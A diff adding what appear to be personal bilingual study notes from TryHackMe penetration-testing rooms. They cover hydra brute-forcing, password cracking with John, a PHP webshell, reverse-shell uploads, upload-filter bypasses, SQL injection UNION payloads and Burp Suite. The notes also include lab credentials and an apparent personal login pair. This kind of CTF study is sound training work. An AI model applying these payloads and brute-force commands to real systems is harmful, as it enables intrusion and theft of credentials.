@@ -1,0 +1,598 @@
+Wordllist : 
+	Subdomain:
+		--> /usr/share/dirb/wordlists/common.txt
+			=> big.txt |
+		--> /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+			=> directory-list-1.0.txt
+	username: 
+		--> /usr/share/commix/src/txt/usernames.txt
+		--> /usr/share/wfuzz/wordlist/others/names.txt
+	password : 
+		--> /usr/share/wordlists/rockyou.txt
+		--> /home/kali/2024_5_CTF/wordlist/wordlist2.txt
+		--> /home/kali/2024_5_CTF/wordlist/10-million-password-list-top-100.txt
+		--> /usr/share/wordlists/fasttrack.txt
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~		
+ToolsRus	
+	https://tryhackme.com/r/room/toolsrus
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+	=> 練習使用 dirbuster、Hydra、nmap、nikto 和 metasploit 等工具
+		--> 找到什麼目錄 : 
+			=> gobuster dir -u http://10.10.157.59 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+		--> 找到誰的名字 : 
+			=> http://10.10.157.59/guidelines
+		--> have authentication :
+			=> http://10.10.157.59/protected
+		--> 受保護部分的密碼
+			=> hydra -l bob -P /usr/share/wordlists/rockyou.txt -f 10.10.157.59 http-get /protected
+			=> login: bob bubbles
+		--> 連接埠 : 
+			=> sudo nmap -sS -sV 10.10.157.59
+			=> sudo nmap -sS -sV -vv -sC 10.10.157.59 -p1234
+		--> /manager/html 目錄 : 
+			=> nikto -id bob:bubbles -h http://10.10.157.59/manager/html
+		--> 取得 shell : metasploit
+			=> msfconsole 
+				> search tomcat
+				=> meterpreter > shell
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+hydra:	
+	--> http:
+		=> hydra -l bob -P /usr/share/wordlists/rockyou.txt -f 10.10.157.59 http-get /protected
+		=> hydra -l -P <MACHINE_IP> http-post-form "<path>:<login_credentials>:<invalid_response>"
+		=> hydra -l <username> -P <wordlist> MACHINE_IP http-post-form
+			 "/:username=^USER^&password=^PASS^:F=incorrect" -V
+	--> ftp:
+		=> hydra -l mark -P /usr/share/wordlists/rockyou.txt ftp://10.10.126.186:10021
+	--> ssh :
+		=> hydra -l frank -P /usr/share/wordlists/rockyou.txt ssh://10.10.126.186 
+	
+	--> sudo hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.212.103 http-post-form "/login:username=^USER^&password=^PASS^:incorrect" -f 
+
+	--> hydra -t 4 -l molly -P /usr/share/wordlists/rockyou.txt ssh://10.10.212.103
+	
+	--> sudo hydra -s 8080 -l admin -P /usr/share/wordlists/rockyou.txt 10.10.173.192 http-post-form "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=&Submit=Sign+in:Invalid username or password" -f 
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+Web Enumeration : 
+	--> https://tryhackme.com/r/room/webenumerationv2
+		--> 手動枚舉 :
+			--> Viewing page source code
+			--> Finding assets
+			--> 在客戶端（我們的瀏覽器）調試和執行 JavaScript 等程式碼
+			
+			--> F12 : Inspecting Tool
+		~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~	
+		--> Gobuster : 
+			--> normal :
+				--> -t 線程（預設10）=> 更改為 64 以提高掃描速度
+				--> -v 詳細 
+				--> -z 不顯示進度
+				--> -q 安靜的
+				--> -o 輸出
+			~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+			--> dir mode : 允許使用者列舉網站目錄
+				--> -w 單字清單 : /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+				--> -x // --extension : 副檔名
+				
+				--> other: 
+					--> https://github.com/OJ/gobuster#dir-mode-options
+					--> -c cookies | -U 使用者名稱 | -s狀態代碼
+			~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~	
+			--> dns mode : 暴力破解子域
+				--> -d 新增網域
+				--> -w 單字清單 
+				--> gobuster dns 
+					=> -d mydomain.thm 
+					=> -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
+				--> other :
+					--> -C cname | -i show-ips | -r	resolver
+			~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~		
+			--> vhost Mode : 暴力破解虛擬主機
+				--> gobuster vhost 
+					=> -u http://example.com 
+					=> -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
+			~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+			--> commond 單字表
+				--> /usr/share/wordlists/dirbuster/directory-list-2.3-*.txt
+				--> /usr/share/wordlists/dirbuster/directory-list-1.0.txt
+				--> /usr/share/wordlists/dirb/big.txt
+				--> /usr/share/wordlists/dirb/common.txt
+				--> /usr/share/wordlists/dirb/small.txt
+				--> /usr/share/wordlists/dirb/extensions_common.txt
+				
+				--> other : 
+					--> https://github.com/danielmiessler/SecLists
+					--> sudo apt install seclists
+		~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~	
+		--> WPScan :
+			--> 運行WordPress 的系統上發現的各種內容
+			
+			--> start :wpscan --update 
+			--> 主題: (t)
+				--> wpscan --url http://cmnatics.playground/ --enumerate t (加速)
+				=> 讓您知道它如何確定所獲得的結果	
+					=> LOCATION	
+				=> 「twentytwenty」主題是 2020 年 WordPress 版本的預設 WordPress 主題
+				
+			--> 插件: (p)
+				--> 「目錄清單」 :  /a/directory 
+				--> /wp-content/plugins/pluginname 
+				--> 外掛程式  : --enumerate p 
+					=> wpscan --url http://cmnatics.playground/ --enumerate p 
+			--> 用戶: (u)
+				--> WordPress 網站使用作者來發布貼文 | 作者其實是一種使用者
+				--> wpscan --url http://cmnatics.playground/ --enumerate u 
+				
+			--> 「弱勢」旗幟 :(v)
+				--> MITRE、NVD 和 CVEDetails 等網站來
+				--> 尋找這些插件的名稱和版本號，以確定是否有任何漏洞
+				
+				--> wpscan --url http://cmnatics.playground/ --enumerate vp 
+					=> 將 WPScan 設定為使用 WPVulnDB API
+					
+			--> 執行密碼攻擊 :
+				--> wpscan 
+					--url http://cmnatics.playground 
+					--passwords rockyou.txt 
+					--usernames cmnatic
+					
+			--> 調整 WPScan 的攻擊性 (WAF) :
+				--> 對 Web 伺服器的大量請求可能會觸發防火牆等內容，並最終導致您被伺服器封鎖
+				--> --plugins-detection
+				--> --plugins-detection aggressive
+		~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~		
+		--> Nikto :
+			--> 流行的漏洞掃描器
+			--> 對所有類型的網路伺服器執行評估
+			
+			--> 基本掃描:
+				--> nikto -h vulnerable_ip
+				--> 檢索網頁伺服器或應用程式（即 Apache2、Apache Tomcat、Jenkins或 JBoss）公佈的標頭
+				--> 尋找任何敏感檔案或目錄（即 login.php、/admin/ 等）
+				
+			--> 掃描多個主機和連接埠:
+				--> 掃描多個主機 -- 獲得網路存取權限 :
+					--> nmap -p80 172.16.0.0/24 -oG - | nikto -h -
+				--> 掃描多個連接埠
+					--> nikto -h 10.10.10.1 -p 80,8000,8080
+			--> 插件:
+				--> 列出外掛程式 : --list-plugins
+				--> -Plugin : 
+					--> nikto -h 10.10.10.1 -Plugin apacheuser
+					
+					--> apacheusers 	: 嘗試枚舉Apache HTTP身份驗證用戶
+					--> cgi 		: 可利用的 CGI 腳本
+					--> robots 		: 分析 robots.txt 文件
+					--> dir_traversal 	: 使用目錄遍歷攻擊（即LFI）來尋找系統文件
+					
+			--> 詳細說明 : 
+				--> -Display : 增加 Nikto 掃描的詳細程度
+				--> 1 : Web 伺服器可能希望將我們重新定位到特定的檔案或目錄，
+				--> 2 : 經常使用 cookie 作為儲存資料的方式
+				--> 3 : 掃描沒有返回您期望的結果
+				
+			-->調整掃描以進行漏洞搜索
+				--> -Tuning  : 
+					--> 0 : File Upload
+						=> 搜尋任何可能允許我們上傳檔案的內容
+						=> 上傳反向 shell 供應用程式執行
+					--> 2 : Misconfigurations / Default Files
+						=>搜尋 Web 伺服器上敏感的常見檔案
+					--> 3 : Information Disclosure
+						=>收集有關 Web 伺服器或應用程式的資訊
+						=>即版本號、HTTP標頭
+					--> 4 : Injection
+						=> XSS或 HTML 注入攻擊的可能位置
+					--> 8 : Command Execution
+						=> 搜尋任何允許我們執行作業系統命令的內容
+						=>產生 shell
+					--> 9 : SQL Injection
+						=>尋找具有易受SQL注入   攻擊的 URL 參數的應用程式
+						
+			--> 保存:
+				--> -o 轉儲 -- 檔案名稱和相容的副檔名
+				--> f 指定格式 
+				--> nikto -h http://ip_address -o report.html
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+	--> Wappalyzer : 
+		--> https://www.wappalyzer.com/
+		--> Click the icon for a list of identified technologies
+		--> Click on a technology or category for more insights
+		
+		--> infomation gathering :
+			--> CVE :
+				--> web frameworks 
+				--> Operating systems 
+				--> Web servers
+			--> shell :
+				--> Programming languages 
+		
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+John The Ripper :
+	--> https://tryhackme.com/r/room/johntheripper0
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+	--> normal : 
+		--> john --wordlist=[path to wordlist] [path to file]
+		--> john --wordlist=/usr/share/wordlists/rockyou.txt [path to file]
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~	
+	--> 基本Hash :
+		--> https://gitlab.com/kalilinux/packages/hash-identifier/-/tree/kali/master
+		--> python3 hash-id.py HashValue // return 格式
+		--> john --format=[format] --wordlist=[path to wordlist] [path to file]
+		--> john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash_to_crack.txt
+		
+		--> john --list=formats | grep -iF "md5" 
+			=> 檢查是否需要新增前綴 (raw-)
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~		
+	--> NTHash 
+		--> 使用 Mimikatz 等工具或從 Active Directory 資料庫 NTDS.dit 
+		-->  將 SAM 資料庫轉儲到 Windows 電腦上來取得 NTHash/NTLM 雜湊
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~	
+	--> unshadow 
+		--> unshadow [path to passwd] [path to shadow] > file
+		--> unshadow /etc/passwd /etc/shadow > unshadowed.txt
+		--> john --wordlist=/usr/share/wordlists/rockyou.txt --format=sha512crypt unshadowed.txt
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~	
+	--> Single Crack
+		--> john --single --format=[format] [path to file]
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~	
+	--> 自訂規則
+		--> 密碼必須至少包含以下其中之一
+		--> Capital letter | Number |Symbol
+		
+		--> john.conf
+			=> [List.Rules:THMRules] 定義規則的名稱
+				=> Az 	附加到單字的末尾
+				=> A0	取得單字並在其前面添加您定義的字符
+				=> c	按位置將字元大寫
+				
+				=> [ ]使用順序在方括號中添加字符集來實現此目的
+				=> " "
+				type :
+					=> [0-9]	- 將包括數字 0-9
+					=> [0]		- 僅包含數字 0
+					=> [A-z]	- 將包括大寫和小寫
+					=> [A-Z]		- 只包含大寫字母
+					=> [a-z]	- 只包含小寫字母
+					=> [a]		- 將僅包括 a
+					=> [!£$%@]	- 將包含符號
+				
+				example :
+					--> 將所有這些放在一起 
+					--> cAz"[0-9] [!£$%@]"
+		--> --rule=PoloPassword
+		--> john --wordlist=[path to wordlist] --rule=PoloPassword [path to file]
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~	
+	--> Zip 檔案
+		--> zip2john [options] [zip file] > [output file]
+		--> zip2john zipfile.zip > zip_hash.txt
+			
+		--> john --wordlist=/usr/share/wordlists/rockyou.txt zip_hash.txt
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~		
+	--> RAR 檔案
+		--> rar2john [rar file] > [output file]
+		--> rar2john rarfile.rar > rar_hash.txt
+			
+		--> john --wordlist=/usr/share/wordlists/rockyou.txt rar_hash.txt
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~	
+	--> SSH金鑰密碼
+		--> ssh2john 將用於登入 SSH 會話的 id_rsa 私鑰轉換為 john 可以使用的哈希格式
+		--> python3 /opt/ssh2john.py [id_rsa private key file] > [output file]
+			
+		--> python3 /opt/ssh2john.py  id_rsa > id_rsa_hash.txt
+		--> john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa_hash.txt
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+	Task : 
+		--> 
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~	
+Upload Vulnerabilities	: 
+	--> https://tryhackme.com/r/room/uploadvulns
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+	--> hosts file : https://www.ionos.co.uk/digitalguide/server/configuration/hosts-file/
+		--> 允許您在本地將 IP 位址映射到域名，而無需依賴 DNS 伺服器為您解析 IP 位址
+	
+		--> Linux和 MacOS : /etc/hosts
+		--> Windows  : C:\Windows\System32\drivers\etc\hosts
+		
+		--> add : 10.10.234.25    overwrite.uploadvulns.thm shell.uploadvulns.thm java.uploadvulns.thm annex.uploadvulns.thm magic.uploadvulns.thm jewel.uploadvulns.thm demo.uploadvulns.thm
+		--> remenber 刪除 !!!!!!!!
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~	
+	--> 1. Enumeration : 
+		--> gobuster
+		--> Burpsuite攔截上傳請
+		--> Wappalyser等瀏覽器擴充功能
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~	
+	--> 覆蓋現有文件 : Overwriting existing files on a server 
+		--> test can I Overwriting files
+			--> download a file change the same name and upload it 
+	
+	--> Remote Code Execution
+		--> Uploading and Executing Shells on a server
+		--> webshel​​l 和反向/綁定 shell
+		
+
+		--> gobuster dir -u http://shell.uploadvulns.thm -w common.txt
+			--> /resources  //unloads
+			
+			--> unload webshell:   webshell.php
+				<?php
+				    echo system($_GET["cmd"]);
+				?>
+			--> http://shell.uploadvulns.thm/resources/webshell.php?cmd=ls
+				--> ?cmd=cd /var/www;ls -a;
+				--> ?cmd=cd /var/www;cat flag.txt
+				
+		--> Reverse Shells:
+			--> nc -lvnp 1234
+			--> upload shell.php //  Pentest Monkey 反向 shell
+				--> change 第 49 行 // ip --> local ip (10.11.92.230)
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+	--> Filtering : 
+		--> Extension Validation (擴充驗證):
+			--> 文件擴展名
+			
+		--> File Type Filtering (文件類型過濾):
+			--> MIME驗證 : 
+				--> Content-Type : image/jpeg ( <type>/<subtype>)
+				--> 基於檔案的副檔名，因此很容易繞過
+			--> Magic Number validation:
+				--> 最開頭的一串字節，用來識別內容
+				--> https://en.wikipedia.org/wiki/List_of_file_signatures
+				
+		--> File Length Filtering: 
+			--> 防止上傳表單將大檔案
+			
+		--> File Name Filtering: 
+			--> 上傳到伺服器的檔案應該是唯一的
+			--> 向文件名稱添加隨機部分
+			--> “壞字符”（例如Linux上的空字節或正斜杠，以及控製字符，例如as;和潛在的 unicode 字元
+			
+		--> File Content Filtering:
+			-->掃描上傳檔案的完整內容，以確保它不會欺騙其副檔名、MIME類型和幻數
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+	--> Bypassing Client-Side Filtering
+		--> 有權存取程式碼更改它就非常容易
+		
+		--> 1. 關閉瀏覽器中的 Javascrip
+		--> 2. 使用 Burpsuite 
+			--> a. 攔截並修改傳入的頁面
+			--> b. 攔截並修改文件上傳
+			--> c. 將文件直接傳送到上傳 -- 查看上傳中使用的參數
+			--> curl -X POST -F "submit:<value>" -F "<file-parameter>:@<path-to-file>" <site>
+			
+		--> 白名單 --排除任何非image/jpeg
+			--> a : right click -- “Do Intercept”，然後選擇“Response to this request”
+				--> delete Javascript 函數 
+			
+			--> 載入的任何外部 Javascript 檔案 :	
+			==> 前往 Burpsuite 視窗頂部的「Options」選項卡
+				==> 然後在「"Intercept Client Requests」部分下編輯條件要刪除的第一行^js$|
+			
+			--> b:  shell 重新命名為「shell.jpg」
+				--> filename ="shell.php"
+				--> MIME : image/jpeg =>text/x-php
+			
+			--> http://java.uploadvulns.thm/images/webshell.php?cmd=cd%20/var/www;cat%20flag.txt
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~		
+	--> Bypassing Server-Side Filtering: 
+		--> File Extensions
+			--> PHP
+				--> .phar擴展繞過了過濾器
+				--> shell.jpg.php //if only fiter first .
+				--> /privacy/ 
+				
+		--> Magic Numbers
+			--> file : check type
+			--> jpg : FF D8 FF DB
+				--> ADD (AAAA) to before <?php>
+				--> hexeditor => FF D8 FF DB
+			--> gif : 47 49 46 38 37 61
+				--> cccccc
+				--> /graphics/
+
+		--> 恢復對hosts所做的更改 : sudo sed -i '$d' /etc/hosts
+		
+		--> Challenge : 
+			--> Wappalyzer : 
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+	--> Task :
+		--> gobuster dir -u http://annex.uploadvulns.thm/ -w common.txt
+			--> /privacy  
+			--> .php5
+		--> gobuster dir -u http://magic.uploadvulns.thm/ -w common.txt
+			--< gif 
+		--> gobuster dir -u http://jewel.uploadvulns.thm/ -w common.txt
+			--> JPEG 
+			--> gobuster dir -u http://jewel.uploadvulns.thm/content/ -w UploadVulnsWordlist_1593564107766.txt
+			
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~	
+	tips : 
+		--> Pentest Monkey Reverse shell webshel​​l 腳本僅在可以運行 PHP 的網路伺服器上運行
+		--> NodeJS : 
+		
+		--> Shell Generator : https://www.revshells.com/
+			=> type     : Reverse | Bind | MSFVenom | HoaxShell
+			=> language : bash | perl | php | powershell | python | node.js
+			=> listen   : nc | socat | msfconsole
+			=> shell    : sh /bash /cmd ...
+			--> node.js #2 : node-conch-shell.js (burp)
+			
+			--> 找出 shell 腳本的新檔名
+			
+			--> gobuster dir -u http://jewel.uploadvulns.thm/content -w ./UploadVulnsWordlist_1593564107766.txt -x .jpg
+				=> BYL.jpg (389)
+				--> http://jewel.uploadvulns.thm/admin
+					=> ../content/BYL.jpg 
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+--> Vulnerability 101
+	--> type
+		--> Operating System		: 作業系統		=> 權限提升。
+		--> (Mis)Configuration-based	: 基於（錯誤）配置 	=> 暴露客戶詳細資訊的網站。
+		--> Weak or Default Credentials	: 弱或預設憑證 		=> "admin"的使用者名稱和密碼
+		--> Application Logic		: 應用邏輯		=> 冒充使用者
+		--> Human-Factor 		: 人的因素		=> 網路釣魚電子郵件
+	--> 漏洞評分
+		--> 通用漏洞評分系統（或CVSS）
+			--> 0 | 0.1-3.9 | 4.0-6.9 | 7.0-8.9 | 9.0-10.0
+		--> 漏洞優先權 ( VPR )
+			--> 重點關注漏洞對組織本身造成的風險，而不是影響等因素（如CVSS）
+	--> 漏洞資料庫
+		-->  NVD (National Vulnerability Database) : https://nvd.nist.gov/vuln
+			--> 「常見漏洞和暴露」（或簡稱CVE ）
+			--> 按類別和提交月份的篩選器查看所有已確認的 CVE
+		-->  Exploit-DB : http://exploit-db.com/
+			--> 保留以軟體或應用程式的名稱、作者和版本儲存的軟體和應用程式的漏洞利用資訊
+	
+	--> 查找漏洞的範例
+		--> 「版本外洩」漏洞來找出應用程式的版本
+		--> 使用 Exploit-DB 上的搜尋過濾器來查找可能適用於「Apache Tomcat 9.0.17」的任何漏洞。
+	
+		--> 1.Information Gathering
+		--> 2. Enumeration & Scanning
+			--> nmap 240.228.189.136
+		--> 3. Application Testing
+			--> version  1.5.2 
+		--> 4. Vulnerability Research
+			--> Remote Code Execution (RCE)
+		--> 5. Exploitation
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+--> Exploit Vulnerability
+	--> 漏洞掃描器 Nessus : https://www.tenable.com/products/nessus
+		--> https://tryhackme.com/r/room/rpnessusredux
+		--> https://kali:8834/#/scans/folders/my-scans
+		--> gcvbnm123:Yct123321
+		
+		--> Policies 建立自訂範本
+		--> Plugin Rules :更改插件屬性，例如隱藏它們或更改其嚴重性
+		
+		--> New Scan 
+			--> Host Discovery : 簡單地查看哪些主機處於活動狀態
+			--> Basic Network Scan : 適合任何主機
+			--> Credentialed Patch Audit : 對主機進行身份驗證並枚舉丟失的更新
+			--> Web Application Tests : 掃描網路應用程式
+		
+		--> after setting => save => launch
+		
+	--> 漏洞研究資料庫 Rapid7 =  Exploit DB 和 NVD
+		--> https://www.rapid7.com/db/
+	--> GitHub : 託管和共享應用程式的源代碼
+	--> command  : Searchsploit :  Exploit-DB 的離線副本 ; command 
+	
+	--> search version 
+		--> download payload  --> use hint 
+		--> change IP /url / port 
+		--> -h | help
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+--> Vulnerability Capstone (task)
+	--> find app name and verion
+	--> go to Exploit-DB find cve 
+	--> search cve payload
+		--> chnage url ip
+		--> get flags
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+--> Burp Suite
+	--> Proxy
+		--> Intercept is on 
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+	--> Repeater 	:  requests and response
+		--> test number : -1 to end 
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+	--> Intruder 	:  brute-force attacks or fuzzing endpoints
+		--> like  Wfuzz or ffuf
+		--> Positions :
+			--> Add § |Clear § (ALL) | Auto §
+		~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+		--> Payloads : 
+			--> Payload set :
+				--> choose positions anf type 
+				--> 編號 : 上到下、從左到右的順序
+				~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+				--> single payload set :  
+					--> Sniper : 線性循環遍歷有效負載
+						--> 一次將一個有效負載插入到請求中定義的每個位置
+						--> username=burp&password=Expl01ted
+					--> Battering Ram :
+						--> 同時發送所有有效負載，每個有效負載插入其各自的位置
+						--> 針對多個位置測試相同的有效負載而不需要順序替換時
+						--> username=burp&password=burp
+				~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+				-->  multiple payload sets : 
+					--> Pitchfork :
+						--> 同時測試具有不同負載的多個位置
+						--> 允許測試人員定義多個有效負載集
+						--> 每個位置使用一組有效負載(最多 20 個) 同時迭代所有位置
+						--> username=joel&password=J03l
+						--> username=harriet&password=Emma1815
+					--> Cluster Bomb :
+						--> 對每個位置執行類似Sniper的攻擊，但同時測試每組的所有有效載荷
+						--> 多個位置具有不同的有效負載並且我們希望一起測試它們
+						--> username=joel&password=J03l
+						--> username=harriet&password=J03l
+			~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+			--> Payload setting  :
+					--> simple list --> add word 
+			--> Payloads processing :
+				--> rule : 
+					--> 每個單字大寫，跳過與正規表示式模式相符的有效負載
+					--> 套用其他轉換或過濾
+					--> Add prefix 
+					--> Add suffix
+			--> Payload encoding :
+				--> unchecking the "URL-encode these characters"
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+	--> Macros(巨集) :
+		--> Setting --> Session --> Macros --> Add link 
+		--> Setting --> Session --> Session handling rules --> Add --> Scope --> Intruder
+		--> back to  "Rule Actions" --> Add "Run a Macro" 
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+	--> Decoder	:
+		-->  md5sum "filename"
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+	--> Comparer 	:  
+		--> comparison of two pieces of data at either the word or byte level
+		--> ASCII 字或位元組來比較兩個資料
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+	--> Sequencer 	: 
+		--> allows us to evaluate the entropy, or randomness, of "tokens"
+		--> Live Capture 即時擷取 : 
+			--> 將產生令牌的請求傳遞給 Sequencer 進行分析
+		--> Manual Load  手動載入:
+			--> 預先產生的令牌樣本清單直接載入到 Sequencer 中進行分析
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~	
+	--> Organizer : save all info 
+		--> 可讓您儲存和註解您可能想要稍後重新造訪的HTTP請求的副本
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+	--> Extender	:
+		--> BApp Store
+			--> Python 擴充功能則需要 Jython 解譯器
+			--> Request Timer擴充功能 : https://github.com/portswigger/request-timer
+				--> blild SQL
+			-->  API endpoints
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+	--> Target : 
+		--> Site map : 
+			--> 樹狀結構中繪製出我們的目標 Web 應用程式
+		--> Issue definitions
+			--> 存取掃描器尋找的所有漏洞的清單
+		--> Scope settings		
+		--> Scoping : right click --> Add to Scope --> Yes
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+	-->  TLS : PortSwigger Certificate Authority (CA) 
+		-->  http://burp/cert --> download cacert.der
+		--> Firefox  :about:preferences -- >view Certificates
+			--> Trust this CA to Identify websites 
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+	--> SQLi : 
+		--> test : GET /about/0' (')
+		--> GET /about/0 UNION ALL SELECT column_name,null,null,null,null FROM information_schema.columns WHERE table_name="people"
+		--> GET /about/0 UNION ALL SELECT group_concat(column_name),null,null,null,null FROM information_schema.columns WHERE table_name="people"
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~	
+	--> Cross-Site Request Forgery(CSRF ) : 隱藏欄位
+
+
+		
+		
+		
+
